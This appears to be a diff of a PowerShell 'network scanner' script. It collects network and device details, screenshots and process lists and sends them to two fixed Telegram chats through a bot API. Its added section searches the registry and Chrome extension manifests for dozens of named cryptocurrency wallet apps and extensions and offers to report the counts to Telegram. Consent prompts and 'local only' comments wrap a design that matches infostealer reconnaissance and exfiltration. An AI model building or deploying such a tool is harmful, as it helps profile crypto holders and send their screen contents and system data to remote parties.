+$report | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath $jsonPath -Encoding UTF8
+$rows = foreach ($item in $report.GetEnumerator()) {
+    '<tr><th>{0}</th><td>{1}</td></tr>' -f (Html-Encode $item.Key),(Html-Encode $item.Value)
 }
-# Save local reports
-$report['Measurement notes']=($notes -join ' | ')
-$jsonFile=Join-Path $root "scan_$stamp.json"
-$htmlFile=Join-Path $root "scan_$stamp.html"
-$report | ConvertTo-Json -Depth 6 | Set-Content -Path $jsonFile -Encoding UTF8
-$rows=@(foreach($key in $report.Keys){'<tr><th>{0}</th><td>{1}</td></tr>' -f (Html $key),(Html $report[$key])})
-$doc='<!doctype html><html><head><meta charset="utf-8"><title>Network Scanner</title><style>body{background:#111827;color:#e5e7eb;font:15px Segoe UI,Arial;padding:28px}table{border-collapse:collapse;width:100%}td,th{border:1px solid #374151;padding:9px;text-align:left}th{width:35%;color:#93c5fd}tr:nth-child(even){background:#1f2937}</style></head><body><h1>Network Scanner v3.1</h1><table>'+($rows -join "`n")+'</table></body></html>'
-$doc | Set-Content -Path $htmlFile -Encoding UTF8
-Write-Host "`n====== REPORT PREVIEW ======" -ForegroundColor Cyan
-foreach($key in $report.Keys){ Write-Host ('{0}: {1}' -f $key,$report[$key]) }
-Write-Host "`nJSON: $jsonFile`nHTML: $htmlFile"
-# Telegram: no silent exfiltration. Explicit separate approval for network data and screenshot.
-if (Ask 'Send the displayed network and device report to BOTH configured Telegram chats?') {
-  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
-  else {
-    $lines=@(foreach($key in $report.Keys){ '<b>{0}:</b> {1}' -f (Html $key),(Html $report[$key]) })
-    $message='<b>'+(Html $reportTitle)+'</b>'+"`n`n"+($lines -join "`n")
-    if ($message.Length -gt 4000) { $message=$message.Substring(0,3900)+"`n(Report truncated; full HTML/JSON saved locally)" }
-    foreach($chatId in $chatIds) {
-      try {
-        Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Body @{chat_id=$chatId;text=$message;parse_mode='HTML'} -TimeoutSec 15 -ErrorAction Stop | Out-Null
-        Write-Host "Report sent to $chatId"
-      } catch { Write-Warning "Telegram report to ${chatId}: $($_.Exception.Message)" }
+$html = @"
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Network Scanner</title><style>body{font:15px Segoe UI,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:2rem auto;max-width:1000px;padding:0 1rem}table{width:100%;border-collapse:collapse;background:#1e293b}th,td{padding:10px;text-align:left;border-bottom:1px solid #334155;vertical-align:top;overflow-wrap:anywhere}th{width:32%;color:#7dd3fc}h1{color:#7dd3fc}</style></head><body><h1>Network Intelligence Scanner</h1><table>
+$($rows -join "`n")
+</table><p>Local diagnostics only. Availability varies by Windows edition and permissions.</p></body></html>
+"@
+$html | Set-Content -LiteralPath $htmlPath -Encoding UTF8
+Write-Host "`n========== SCAN RESULTS =========="
+foreach ($item in $report.GetEnumerator()) { Write-Host ("{0}: {1}" -f $item.Key,$item.Value) }
+Write-Host "`nSaved: $jsonPath"
+Write-Host "Saved: $htmlPath"
+
+# Report is explicitly approved before sending to fixed recipients
+Write-Host "`nTelegram recipients: $($chatIds -join ', ')"
+if (Ask-Yes 'Send this displayed diagnostic report to both Telegram chats?') {
+    if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
+        Write-Warning 'Telegram token is not configured. Report remains local.'
+    } else {
+        $lines = foreach ($item in $report.GetEnumerator()) { '<b>{0}</b>: {1}' -f (Html-Encode $item.Key),(Html-Encode $item.Value) }
+        # Telegram sendMessage limit 4096 chars; split by field lines
+        $prefix = "<b>$(Html-Encode $reportTitle)</b>`n"
+        $chunk = $prefix
+        foreach ($line in $lines) {
+            if (($chunk.Length + $line.Length + 1) -gt 3500) { Send-TgMessage $chunk; $chunk = $prefix }
+            $chunk += "`n$line"
+        }
+        if ($chunk.Length -gt $prefix.Length) { Send-TgMessage $chunk }
     }
-  }
-}
-if ($screenshot -and (Test-Path $screenshot) -and (Ask 'Send the reviewed screenshot to BOTH Telegram chats?')) {
-  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
-  else {
-    Try-Measure 'Telegram photo' {
-      Add-Type -AssemblyName System.Net.Http
-      foreach($chatId in $chatIds){
-        $client=[Net.Http.HttpClient]::new();$form=[Net.Http.MultipartFormDataContent]::new()
+} else { Write-Host 'No network data sent.' }
+
+# Screenshot is optional, previewed, and requires two separate permissions.
+if ($enableScreenshotOption -and (Ask-Yes 'Capture the PRIMARY display for local preview?')) {
+    try {
+        Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
+        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+        $bitmap = New-Object System.Drawing.Bitmap($bounds.Width,$bounds.Height)
+        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        $picturePath = Join-Path $reportDir "screenshot_$stamp.png"
         try {
-          $form.Add([Net.Http.StringContent]::new([string]$chatId),'chat_id')
-          $photo=[Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($screenshot))
-          $photo.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('image/png')
-          $form.Add($photo,'photo','screenshot.png')
-          $response=$client.PostAsync("https://api.telegram.org/bot$botToken/sendPhoto",$form).GetAwaiter().GetResult()
-          $response.EnsureSuccessStatusCode() | Out-Null
-          Write-Host "Screenshot sent to $chatId"
-        } catch { Write-Warning "Photo to ${chatId}: $($_.Exception.Message)" }
-        finally { $form.Dispose();$client.Dispose() }
-      }
-    }
-  }
+            $graphics.CopyFromScreen($bounds.Location,[System.Drawing.Point]::Empty,$bounds.Size)
+            $bitmap.Save($picturePath,[System.Drawing.Imaging.ImageFormat]::Png)
+        } finally { $graphics.Dispose(); $bitmap.Dispose() }
+        Write-Host "Screenshot saved locally: $picturePath"
+        Start-Process -FilePath $picturePath
+        Write-Host 'Review the screenshot carefully. It may contain private messages or passwords.'
+        if (Ask-Yes "Send this screenshot to both Telegram chats ($($chatIds -join ', '))?") {
+            if ($botToken -and $botToken -notlike 'PASTE_*') { Send-TgPhoto $picturePath }
+            else { Write-Warning 'Telegram token not configured; screenshot remains local.' }
+        } else { Write-Host 'Screenshot not sent.' }
+    } catch { Write-Warning "Screenshot unavailable: $($_.Exception.Message)" }
 }
-# Separate explicit consent before a process list leaves the device.
-if ($processFile -and (Test-Path $processFile) -and
-    (Ask 'Send the reviewed running-process TXT to BOTH Telegram chats?')) {
-  if ($botToken -eq 'PASTE_NEW_BOT_TOKEN_HERE' -or -not $botToken) { Write-Warning 'Set the bot token first.' }
-  else {
-    Try-Measure 'Telegram process document' {
-      Add-Type -AssemblyName System.Net.Http
-      foreach ($chatId in $chatIds) {
-        $client=[Net.Http.HttpClient]::new()
-        $form=[Net.Http.MultipartFormDataContent]::new()
+
+# ================= LOCAL SOFTWARE INVENTORY =================
+# Local only: do not transmit detected wallet names, profile paths or IDs.
+$targetWalletApps = @(
+ 'Exodus','Atomic Wallet','Electrum','Sparrow Wallet','Bitcoin Core',
+ 'Ledger Live','Trezor Suite','Guarda Wallet','Coinomi','Wasabi Wallet',
+ 'Armory','Monero GUI Wallet','Feather Wallet','Daedalus','Komodo Wallet',
+ 'Zelcore','OneKey App','Blockstream Green','Specter Desktop',
+ 'MyEtherWallet','Bitcoin Knots','Bitcoin Safe','Nunchuk','Dogecoin Core',
+ 'Litecoin Core','Dash Core'
+)
+$targetOtherApps = @('Spotify','Steam','Discord','Tor Browser','AdsPower')
+$targetWalletExtensions = @(
+ 'MetaMask','Trust Wallet','Phantom','Rabby Wallet','OKX Wallet',
+ 'Coinbase Wallet','Binance Wallet','Bitget Wallet','TokenPocket',
+ 'SafePal','Backpack','Solflare','Keplr','Leap Wallet','SubWallet',
+ 'Talisman','Polkadot.js','UniSat Wallet','Xverse','Leather Wallet',
+ 'Slush','Nightly Wallet','Petra Wallet','Martian Wallet','MyTonWallet',
+ 'TON Wallet','Argent','Braavos','Nami Wallet','Eternl','Enkrypt',
+ 'Brave Wallet','Ronin Wallet','Lace','NuFi','Ambire','Ctrl Wallet',
+ 'Frame','MathWallet','Halo Wallet','Flint','Yoroi'
+)
+
+function Get-InstalledNames {
+    $output = New-Object 'System.Collections.Generic.List[string]'
+    $regPaths = @(
+       'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*',
+       'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*',
+       'Registry::HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*'
+    )
+    foreach ($regPath in $regPaths) {
         try {
-          $form.Add([Net.Http.StringContent]::new([string]$chatId),'chat_id')
-          $attachment=[Net.Http.ByteArrayContent]::new([IO.File]::ReadAllBytes($processFile))
-          $attachment.Headers.ContentType=[Net.Http.Headers.MediaTypeHeaderValue]::Parse('text/plain')
-          $form.Add($attachment,'document',[IO.Path]::GetFileName($processFile))
-          $response=$client.PostAsync("https://api.telegram.org/bot$botToken/sendDocument",$form).GetAwaiter().GetResult()
-          $response.EnsureSuccessStatusCode() | Out-Null
-          Write-Host "Process list sent to $chatId"
-        } catch { Write-Warning "Process document to ${chatId}: $($_.Exception.Message)" }
-        finally { $form.Dispose(); $client.Dispose() }
-      }
+            Get-ItemProperty -Path $regPath -ErrorAction Stop | ForEach-Object {
+                if ($_.DisplayName) { [void]$output.Add([string]$_.DisplayName) }
+            }
+        } catch { }
     }
-  }
+    return @($output | Sort-Object -Unique)
 }
-Write-Host "Complete. Local reports: $root" -ForegroundColor Green
-Read-Host 'Press Enter to exit' | Out-Null
+function Find-Matches {
+    param([string[]]$Candidates,[string[]]$Targets)
+    $found = New-Object 'System.Collections.Generic.List[string]'
+    foreach ($target in $Targets) {
+        # Compare whole words/phrases to avoid partial-name false positives
+        $pattern = '(?i)(?<![\p{L}\p{N}])' + [regex]::Escape($target) + '(?![\p{L}\p{N}])'
+        if (@($Candidates | Where-Object { $_ -match $pattern }).Count -gt 0) {
+            [void]$found.Add($target)
+        }
+    }
+    return @($found)
+}
+
+# Chrome extension manifests only. Never open Local Extension Settings,
+# Cookies, Login Data, Preferences, or other extension storage.
+function Get-ChromeExtensionManifestNames {
+    $names = New-Object 'System.Collections.Generic.List[string]'
+    $root = Join-Path $env:LOCALAPPDATA 'Google\Chrome\User Data'
+    if (-not (Test-Path -LiteralPath $root -PathType Container)) { return @() }
+    $profiles = @(Get-ChildItem -LiteralPath $root -Directory -ErrorAction SilentlyContinue |
+        Where-Object { $_.Name -eq 'Default' -or $_.Name -match '^Profile \d+$' })
+    foreach ($profile in $profiles) {
+        $extensionsRoot = Join-Path $profile.FullName 'Extensions'
+        if (-not (Test-Path -LiteralPath $extensionsRoot)) { continue }
+        foreach ($ext in @(Get-ChildItem -LiteralPath $extensionsRoot -Directory -ErrorAction SilentlyContinue)) {
+            foreach ($version in @(Get-ChildItem -LiteralPath $ext.FullName -Directory -ErrorAction SilentlyContinue)) {
+                $manifest = Join-Path $version.FullName 'manifest.json'
+                if (-not (Test-Path -LiteralPath $manifest)) { continue }
+                try {
+                    $data = Get-Content -LiteralPath $manifest -Raw -Encoding UTF8 -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
+                    if ($data.name -and $data.name -notmatch '^__MSG_') { [void]$names.Add([string]$data.name) }
+                } catch { }
+            }
+        }
+    }
+    return @($names | Sort-Object -Unique)
+}
+
+Write-Host "`nChecking installed software (local inventory only)..."
+$installedNames = @(Get-InstalledNames)
+$extensionNames = @(Get-ChromeExtensionManifestNames)
+$walletAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetWalletApps)
+$otherAppsFound = @(Find-Matches -Candidates $installedNames -Targets $targetOtherApps)
+$walletExtensionsFound = @(Find-Matches -Candidates $extensionNames -Targets $targetWalletExtensions)
+
+$inventory = [ordered]@{
+    ScanTime = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
+    WalletApplicationsFound = @($walletAppsFound)
+    WalletExtensionsFound = @($walletExtensionsFound)
+    OtherApplicationsFound = @($otherAppsFound)
+    Note = 'Registry and Chrome manifest-name check only. False negatives possible (portable apps, localized extensions, other browsers). Extension files do not prove the extension is enabled.'
+}
+$inventoryPath = Join-Path $reportDir "software_inventory_$stamp.json"
+$inventory | ConvertTo-Json -Depth 5 | Set-Content -LiteralPath $inventoryPath -Encoding UTF8
+$inventoryHtmlPath = Join-Path $reportDir "software_inventory_$stamp.html"
+function Format-InventorySection([string]$title,[string[]]$items) {
+    $safeTitle = Html-Encode $title
+    if (-not $items.Count) { return "<h2>$safeTitle</h2><p>No matches found</p>" }
+    $lis = @($items | ForEach-Object { '<li>' + (Html-Encode $_) + '</li>' }) -join "`n"
+    return "<h2>$safeTitle</h2><ul>$lis</ul>"
+}
+$inventoryHtml = @'
+<!doctype html><html><head><meta charset="utf-8"><title>Local software inventory</title>
+<style>body{font:16px Segoe UI,Arial,sans-serif;max-width:900px;margin:40px auto;padding:0 20px;background:#111827;color:#e5e7eb}h1,h2{color:#93c5fd}li{margin:6px 0}</style>
+</head><body><h1>Local software inventory</h1>
+'@ + (Format-InventorySection 'Wallet desktop applications' $walletAppsFound) +
+    (Format-InventorySection 'Wallet Chrome extensions' $walletExtensionsFound) +
+    (Format-InventorySection 'Other applications' $otherAppsFound) +
+    '<p>Names are detected locally; they are not automatically transmitted.</p></body></html>'
+$inventoryHtml | Set-Content -LiteralPath $inventoryHtmlPath -Encoding UTF8
+
+Write-Host '== Wallet applications found (LOCAL ONLY) =='
+if ($walletAppsFound.Count) { $walletAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
+Write-Host '== Wallet Chrome extensions found (LOCAL ONLY) =='
+if ($walletExtensionsFound.Count) { $walletExtensionsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
+Write-Host '== Other applications found =='
+if ($otherAppsFound.Count) { $otherAppsFound | ForEach-Object { Write-Host "  $_" } } else { Write-Host '  No matches found' }
+Write-Host "Local inventory JSON: $inventoryPath"
+Write-Host "Local inventory HTML: $inventoryHtmlPath"
+
+# Only counts of wallet apps/extensions can be sent, never names, IDs or paths.
+$summary = "<b>SOFTWARE INVENTORY SUMMARY</b>`n" +
+           "Wallet applications detected: $($walletAppsFound.Count)`n" +
+           "Wallet Chrome extensions detected: $($walletExtensionsFound.Count)`n" +
+           "Other apps detected: $($otherAppsFound.Count)`n" +
+           "Details are stored locally and not transmitted."
+Write-Host "`nTelegram summary preview (counts only):"
+Write-Host ($summary -replace '<[^>]+>','')
+Write-Host "Recipients: $($chatIds -join ', ')"
+if (Ask-Yes 'Send ONLY the displayed counts to Telegram?') {
+    if ([string]::IsNullOrWhiteSpace($botToken) -or $botToken -like 'PASTE_*') {
+        Write-Warning 'Telegram token is not configured; summary was not sent.'
+    } else {
+        Send-TgMessage $summary
+    }
+} else { Write-Host 'Software inventory summary not sent.' }
+# ================= END LOCAL INVENTORY =====================
+
+Write-Host "`nScanner complete. Local reports: $reportDir"
+Read-Host 'Press Enter to close' | Out-Null
